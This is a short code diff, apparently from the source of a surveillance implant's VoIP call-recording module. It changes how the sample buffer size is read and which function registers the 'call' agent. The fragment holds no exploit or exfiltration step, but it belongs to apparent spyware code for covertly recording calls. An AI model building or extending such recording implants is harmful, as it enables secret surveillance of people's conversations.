@@ -2756,7 +2756,7 @@ DWORD __stdcall PM_VoipRecordInit(JSONObject elem)
 {
 	// Inizializza la dimensione dei sample su disco
 	// e il fattore di compressione
-	max_sample_size = (DWORD) elem[L"buffer"]->AsNumber()*1024;
+	max_sample_size = (DWORD) elem[L"buffer"]->AsNumber();
 	compress_factor = (DWORD) elem[L"compression"]->AsNumber();
 
 	// Riallochiamo l'array per i PCM
@@ -2793,5 +2793,5 @@ DWORD __stdcall PM_VoipRecordUnregister()
 
 void PM_VoipRecordRegister()
 {
-	AM_MonitorRegisterBSON(L"call", PM_VOIPRECORDAGENT, (BYTE *)PM_VoipRecordDispatch, (BYTE *)PM_VoipRecordStartStop, (BYTE *)PM_VoipRecordInit, (BYTE *)PM_VoipRecordUnregister);
+	AM_MonitorRegister(L"call", PM_VOIPRECORDAGENT, (BYTE *)PM_VoipRecordDispatch, (BYTE *)PM_VoipRecordStartStop, (BYTE *)PM_VoipRecordInit, (BYTE *)PM_VoipRecordUnregister);
 }
